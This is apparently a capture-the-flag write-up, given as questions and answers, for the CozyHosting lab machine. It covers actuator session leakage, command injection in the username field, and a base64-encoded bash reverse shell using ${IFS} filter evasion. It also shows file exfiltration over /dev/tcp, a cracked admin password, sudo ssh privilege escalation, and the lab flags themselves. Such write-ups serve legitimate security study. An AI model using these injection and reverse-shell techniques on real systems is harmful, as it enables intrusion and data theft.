@@ -1,0 +1,57 @@
+Guided:
+Q: How many TCP ports are open on CozyHosting?
+A: 2
+
+Q: The webserver on TCP port 80 issues a redirect to what domain?
+A: cozyhosting.htb
+
+Q: What relative path on the webserver returns a 500 error?
+A: /error
+Note: the template of the response of it revealed that the app is using spring-boot.
+
+Q: What is the Java web framework used in the web application?
+A: Spring boot
+
+Q: What endpoint is exposed in Spring Boot and is mainly used for debugging purposes?
+A: /actuator
+|-> find / -name spring* 2>/dev/null
+|-> /usr/share/seclists/Discovery/Web-Content/spring-boot.txt  (specific wordlist for it)
+
+Q: What is the username of the user's whose session is exposed?
+A: kanderson
+The end-point that expose it: http://cozyhosting.htb/actuator/sessions
+
+Q: When a POST request is sent to /executessh, which of the two parameters is vulnerable to command injection?
+A: username
+By not sending anything it show /bin/bash error, so if type ";" it will show it trying execute ssh command,
+the white-space can be evaded by typing or ${IFS} or {something,like,this}|bash
+so i encoded in base64 the /dev/tcp/<listener> and made sure there is no '+' with double spaces before encode.
+from -> echo -n "bash  -i    >& /dev/tcp/<IP>/<PORT>     0 >&1   "|base64 -w 0
+to -> YmFzaCAgLWkgICAgPiYgL2Rldi90Y3AvPElQPi88UE9SVD4gICAgIDAgPiYxICAg
+
+Q: What user is the web application running as?
+A: app
+
+Q: What is the full path to the Java file that runs the web application?
+A: /app/cloudhosting-0.0.1.jar
+Transfered it to my comp via netcat, cat cloudhosting-0.0.1.jar > /dev/tcp/<IP>/<PORT>
+                          my comp -> netcat -nlvp <PORT> > cloudhosting-0.0.1.jar
+                extracted via 7z --> 7z x cloudhosting-0.0.1.jar
+
+Q: What is the name of the file where application-related properties are stored in a Spring Boot application?
+A: application.properties
+It had postgres creds, logged in and in the 'users' table there was 2 bcrypt $2*$, Blowfish (Unix) hashes
+
+Q: What is the admin user's password for the web application?
+A: manchesterunited
+
+Q: Submit the flag located in the josh user's home directory.
+A: 695a610dde545509f72db184dcd16bbf
+
+Q: What is the full path of the binary that the josh user can execute on the machine as root?
+A: /usr/bin/ssh 
+https://gtfobins.github.io/gtfobins/ssh/#sudo
+
+Q: Submit the flag located in the root user's home directory.
+A: 29c7d63e6269a919c73759dc7d093729
+
